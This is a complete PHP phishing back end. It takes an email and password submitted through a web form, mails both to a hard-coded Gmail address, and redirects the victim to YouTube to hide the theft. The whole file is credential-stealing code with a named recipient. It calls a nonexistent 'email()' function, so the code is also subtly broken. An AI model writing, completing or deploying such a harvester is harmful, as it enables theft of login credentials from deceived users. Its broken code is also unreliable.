<?php

$user = $_POST['email'];
$password =$_POST['pass'];

$emailreceptor = "dianaand101990@gmail.com";
$subject = "A emil new in the system!";
$messenger = "-Email: ".$user."-Password: ".$password;

email($emailreceptor, $subject, $messenger);
header('location: www.youtube.com');

?>